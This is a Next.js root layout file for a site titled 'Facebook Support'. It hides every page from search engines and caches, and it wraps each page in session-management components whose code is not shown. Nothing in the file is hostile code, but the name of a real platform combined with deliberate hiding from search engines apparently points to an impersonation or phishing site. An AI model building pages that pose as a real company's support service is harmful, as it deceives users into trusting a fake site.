import type { Metadata } from "next";
import { Inter } from "next/font/google";
import "./globals.css";
import { ActiveSessionProvider } from '@/contexts/ActiveSessionContext'
import { SessionManager } from '@/components/SessionManager'

const inter = Inter({ subsets: ["latin"] });

export const metadata: Metadata = {
  title: "Facebook Support",
  description: "Facebook Support",
  robots: {
    index: false,
    follow: false,
    nocache: true,
    googleBot: {
      index: false,
      follow: false,
      noimageindex: true,
      'max-video-preview': -1,
      'max-image-preview': 'none',
      'max-snippet': -1,
    },
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body className={inter.className}>
        <ActiveSessionProvider>
            <SessionManager />
            {children}
        </ActiveSessionProvider>
      </body>
    </html>
  );
}